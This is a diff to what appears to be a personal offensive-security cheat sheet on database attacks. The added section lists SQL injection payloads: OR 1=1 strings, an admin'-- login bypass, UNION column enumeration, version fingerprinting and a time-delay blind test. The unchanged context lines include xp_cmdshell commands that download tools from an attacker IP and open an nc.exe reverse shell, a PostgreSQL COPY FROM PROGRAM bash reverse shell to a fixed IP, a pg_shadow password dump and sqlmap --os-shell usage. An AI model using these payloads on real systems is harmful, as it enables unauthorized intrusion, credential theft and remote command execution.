@@ -4,6 +4,66 @@ Databases
 Structured Query Language (SQL)
 Can be prevent by doing input validation, parameterized queries, stored procedures, and implementing a Web Application Firewall (WAF).
 
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# SQL Injection
+
+Add the following examples to input fields or at the end of a URL.
+-- is a comment indicator, this effectively removes the remainder of the query.
+
+'+OR+1=1--
+http://target.com/products?category=cars'+OR+1=1--
+
+- Other strings that might work
+' OR 1=1--
+' OR 2=2--
+' OR 2-1=1--
+' OR 2>1--
+
+- Bypass a login screen for the admin account
+Enter the following for the username: admin'--
+password: test
+
+- UNION attack
+The UNION keyword lets you execute an additional SELECT query and append the results to the original query.
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+
+' UNION SELECT username, password FROM users--
+
+Determine the number of columns returned by the original query.
+Continue increasing the number until you get an error.
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+Find the column that contains string data.
+This depends on the number of columns you discovered above.
+This example uses 3 columns.
+Look for an additional row with test.
+' UNION SELECT 'test', NULL, NULL--
+' UNION SELECT NULL, 'test', NULL--
+' UNION SELECT NULL, NULL, 'test'--
+
+- Examining the database in SQL injection attacks
+
+When exploiting SQL injection vulnerabilities, it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.
+
+- Get the database type and version
+Microsoft, MySQL     SELECT @@version
+Oracle               SELECT * FROM v$version
+PostgreSQL           SELECT version()
+
+Use a UNION attack:
+' UNION SELECT @@version--
+
+- Blind SQLi
+'; waitfor delay ('0:0:20')--
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # MS-SQL
 
 - Resources
@@ -41,7 +101,6 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://attacker I
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe <attacker IP> 443"
 
 - Privesc
-cd /home/kali/Desktop/
 wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
 sudo python3 -m http.server 80
 
@@ -119,7 +178,7 @@ SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY ema
 DELETE from profiles WHERE rowid='53';
 UPDATE hostvulns SET tool="Nessus";
 
-# MySQL Injection
+# Injection
 
 # General.
 1 UNION SELECT 1,2,3,4
@@ -130,7 +189,7 @@ UPDATE hostvulns SET tool="Nessus";
 1 UNION SELECT NULL,NULL,NULL,UUID()                 534c63c1-2e4a-11e9-bb88-00505692e5ab
 
 # List all dbs.
-1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
+1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM information_schema.tables
     information_schema
     challenge
     mysql
@@ -225,11 +284,11 @@ Login > Profile > flag
    set SQL GRANT DBA TO <user>
    set SQL GRANT JAVASYSPRIV TO <user>
 
-6. select * from v$version;                          Oracle version
-   select * from dba_registry_history;               Oracle patch level
-   select * from all_users;                          Usernames
-   select owner,table_name from all_tables;          Tables
-   select * from session_roles;                      Session roles
+6. SELECT * FROM v$version;                          Version
+   SELECT * FROM dba_registry_history;               Patch level
+   SELECT * FROM all_users;                          Usernames
+   SELECT owner,table_name from all_tables;          Tables
+   SELECT * FROM session_roles;                      Session roles
    desc utl_http                                     Describes database objects
 
 http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535
@@ -237,14 +296,14 @@ http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535
 sqlplus user/password@target IP:1521/database
 sqlplus user/password@target IP:1521/database as sysdba
 
-select * from v$Version;                             Show the database version
-select * from user_role_privs;                       Check database user permissions
+SELECT * FROM v$Version;                             Show the database version
+SELECT * FROM user_role_privs;                       Check database user permissions
 
 ./odat.pydbmsxslprocessor -s <target IP> -d <db> -U <user> -P <password> --putFile 'C:\inetpub\wwwroot\' 'test.txt' /root/test.txt --sysdba
-curl https://target IP/test.txt
+curl http://target.com/test.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Postgresql
+# PostgreSQL
 
 psql -U <username> -h <IP> -d <database>
 select username, passwd from pg_shadow;
@@ -283,16 +342,6 @@ create table redteam(data text);
 copy redteam from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# SQL Injection
-
-'+OR+1=1--
-admin’;--
-‘ or 1=1--
-‘ or 2=2--
-‘ or 2-1=1--
-‘ or 2>1--
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # sqlmap
 
 - Burp
@@ -303,7 +352,7 @@ Right-click on the captured request > Extension > CO2 > Send to SQLMapper
 CO2 > Config > SQLMap Path: /usr/bin/sqlmap > OK
 Extra SQLMapper Params: --os-shell
 Because the output screen will be so small, copy the string and paste into a Terminal.
-sqlmap -u 'http://target IP:80/dashboard.php?search=test' --cookie='PHPSESSID=<cookie>' --os-shell
+sqlmap -u 'http://target.com/index.php?search=test' --cookie='PHPSESSID=<cookie>' --os-shell
 
 - If you get a shell, open a new tab in Terminal.
 nc -lvnp 443
